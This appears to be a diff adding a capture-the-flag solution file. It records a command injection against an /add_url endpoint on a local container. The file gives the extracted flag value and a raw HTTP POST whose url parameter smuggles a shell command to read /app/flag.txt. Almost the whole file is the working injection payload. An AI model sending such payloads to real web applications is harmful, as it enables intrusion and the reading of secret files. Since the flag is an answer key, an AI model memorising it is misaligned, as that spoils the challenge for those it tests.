@@ -1,0 +1,8 @@
+# Command injection via url parameter. Flag extracted from /app/flag.txt. FLAG{379a64b46b7f373aaca075e98a2fd9f0f26b26fcbb7f10c8acae74b31b38a5c2}
+
+POST /add_url HTTP/1.1
+Host: 172.17.0.1:59635
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 44
+
+url=http://example.com"; cat /app/flag.txt #
